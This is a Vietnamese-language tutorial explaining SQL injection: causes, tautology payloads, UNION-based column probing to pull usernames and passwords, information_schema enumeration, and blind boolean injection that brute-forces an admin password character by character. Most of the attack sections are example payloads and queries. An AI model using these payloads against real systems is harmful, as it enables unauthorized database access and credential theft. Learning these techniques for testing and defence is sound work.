# SQL INJECTION
### 1.SQL Injection là gì?
+ SQL Injection là một kỹ thuật tấn công cho phép kẻ tấn công chèn mã SQL vào dữ liệu gửi đến máy chủ.
+ Cuối cùng được thực thi mã trên máy chủ cơ sở dữ liệu
### 2.Nguyên nhân chính của lỗ hổng SQL Injection là gì?
+ Do dữ liệu đầu vào từ người dùng không được kiểm tra kỹ lưỡng
+ Sử dụng các câu lệnh SQL động,thao tác nối dữ liệu người dùng với mã lệnh SQL gốc
### 3.Các dạng tấn công SQL Injection:
#### 1.Retrieving hidden data: 
##### Có thể sửa câu truy vấn để trả về kết quả bổ sung
Ví dụ : input đầu vào là @query = 'john'
Ở đây câu truy vấn sẽ SELECT đến bảng users để lấy dữ liệu có username = 'john'
```Mysql
SELECT * FROM users WHERE username = @query;
```
Nhưng ở đây chúng ta không biết trong bảng users có những username nào.Vì thế chúng ta cần sửa lại input đầu vào để câu truy vấn luôn đúng.@query = 'john' or 1 = 1 --  
```MySQL
SELECT * FROM users WHERE username = 'john' or 1 = 1 -- ;
```
Kết quả trả về sẽ là tất cả dữ liệu của bảng users
#### 2.Retrieving data from other database tables: 
##### Kiểu tấn công này liên quan đến sử dụng UNION để kết hợp 2 hay nhiều câu lệnh SELECT.
Để câu truy vấn UNION hoạt động thì phải đáp ứng được 2 yêu cầu:

+ Các câu truy vấn riêng phải cùng có số cột.
+ Các kiểu dữ liệu trong mỗi cột phải tương thích với nhau.

Ví dụ : input đầu vào là @query = '123'
```MySQL
SELECT name,type FROM category WHERE id = @query;
```
Ở đây mình muốn lấy username,password từ bảng `users`,mình cần check trước là số lượng cột ở câu truy vấn trước.@query có thể:
```MySQL
'123' UNION SELECT NULL,NULL--
'123' UNION SELECT NULL,NULL,NULL--
'123' UNION SELECT NULL,NULL,NULL,NULL--
etc.
```
Ở đây mình dùng `NULL` vì nó có thể chuyển đổi thành mọi kiểu dữ liệu.Mình sẽ thử lần lượt các câu query cho đến khi server không báo lỗi.
```MySQL
SELECT name,type FROM category WHERE id = '123' UNION SELECT NULL,NULL--;
```
Bây giờ mình cần kiểm tra dữ liệu của từng cột.@query có thể:
```MySQL
'123' UNION SELECT 'x',NULL--
'123' UNION SELECT NULL,'x'--
'123' UNION SELECT 'x','y'--
etc.
```
Sau khi xác định được kiểu dữ liệu thì bây giờ mình cần truy vấn lấy dữ liệu ở bảng `users`
```MySQL
SELECT name,type FROM category WHERE id = '123' UNION SELECT username,password FROM users--;
```
#### 3.Examining the database:
##### Kiểu tấn công này sẽ lấy được phiên bản và cấu trúc cơ sở dữ liệu
Truy vấn đến `information_schema.tables` để liệt kê các bảng trong cơ sở dữ liệu
```MySQL
SELECT * FROM information_schema.tables
```
Sau đó chúng ta có thể truy vấn `information_schema.columns`để xem các cột dữ liệu của chúng
```MySQL
SELECT * FROM information_schema.columns WHERE table_name='users'
```
Cuối cùng ta có thể truy vẫn đến từng giá trị của bảng
```MySQL
SELECT user_abcd,pasword_efgh FROM users
```
Mình thấy hay kết hợp với câu truy vấn `UNION`
#### 4.Bind SQL Injection:
##### Kiểu tấn công này sẽ không trả về kết quả của câu truy vấn đưa vào
Ví dụ:
```MySQL
SELECT * FROM users WHERE username=@query;
-- Nếu câu truy vấn đúng sẽ in ra giao diện "successfully"
-- Ngược lại sẽ không in gì
```
Bây giờ mình thử xâm nhập:
```MySQL
SELECT * FROM users WHERE username='admin';
-- hiện thị "successfully"
SELECT * FROM users WHERE username='admin' AND 1 = 2;
-- không hiện thị
SELECT * FROM users WHERE username='admin' AND 1=1;
-- hiện thị "successfully"
```
Gỉa sử mình biết trong cơ sở dữ liệu có bảng `users` và có username = 'admin',mình cần tìm ra password.
Ban đầu mình cần tìm ra độ dài của password @length = 1:
```MySQL
SELECT * FROM users WHERE username='admin' 
AND (select 'pwd' from users where username = 'admin' AND LENGTH(password)>@length)='pwd';
-- hiện thị "successfully"
```
Mình cần tăng @length đến khi nào không hiện thị `successfully`,giả sử length =10 bây giờ mình cần tìm password bằng cách cắt và so sánh từng kí tự 1.
```MySQL
SELECT * FROM users WHERE username='admin' 
AND (select SUBSTRING(password,1,1) from users where username = 'admin')='a';
-- không hiện thị
-- Chỗ này mình cần thay đổi giá trị 'a' đến khi hiện thị
```
Mình dùng `Bruteforce` để gửi các payload.Ở đây có 2 payload là vị trí của từng ký tự và payload để so sánh (a,b) 
```MySQL
SELECT * FROM users WHERE username='admin' 
AND (select SUBSTRING(password,$a$,1) from users where username = 'admin')='$b$';
```
Chạy xong sẽ tìm được password!
